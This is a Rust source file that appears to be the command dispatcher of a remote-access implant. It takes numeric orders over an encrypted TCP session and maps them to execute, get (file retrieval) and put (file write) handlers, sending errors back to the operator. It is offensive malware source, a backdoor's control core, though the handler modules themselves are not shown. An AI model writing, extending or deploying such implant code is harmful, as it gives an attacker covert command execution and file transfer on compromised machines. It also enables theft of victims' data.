use communication::*;
use handler::*;
use byteorder::{ByteOrder, LittleEndian};
use std::io::Write;

pub fn parse_input(implant_session: &mut encrypted_tcp::EncryptedSession, orders: u32) -> u32 {
    match orders {
        1000 => {
            match execute::server_run(implant_session) {
                    Ok(_) => implant_session.send(),
                    Err(err) => {
                        implant_session.tcp_session.output_buffer.append(&mut err.to_string().into_bytes());
                        implant_session.tcp_session.output_buffer.append(&mut "\n".to_owned().into_bytes());
                        implant_session.send();
                    },
                }
            0
        },
        1001 => 1,
        1002 => {
            match get::server_run(implant_session) {
                Ok(_) => implant_session.send(),
                Err(err) => {
                    LittleEndian::write_u32(&mut implant_session.tcp_session.orders, 9998);
                    implant_session.send_orders();
                    implant_session.tcp_session.output_buffer.append(&mut err.to_string().into_bytes());
                    implant_session.tcp_session.output_buffer.append(&mut "\n".to_owned().into_bytes());
                    implant_session.send();
                }
            }
            0
        },
        1003 => {
            match put::server_run(implant_session) {
                Ok(mut to_create) => {
                    LittleEndian::write_u32(&mut implant_session.tcp_session.orders, 9999);
                    implant_session.send_orders();
                    implant_session.recv();
                    to_create.write(&implant_session.tcp_session.input_buffer).unwrap();
                    to_create.sync_all().unwrap();
                    0
                }
                Err(err) => {
                    LittleEndian::write_u32(&mut implant_session.tcp_session.orders, 9998);
                    implant_session.send_orders();
                    implant_session.tcp_session.output_buffer.append(&mut err.to_string().into_bytes());
                    implant_session.tcp_session.output_buffer.append(&mut "\n".to_owned().into_bytes());
                    implant_session.send();
                    0
                }
            }
        },
        _ => 0,
    }
}
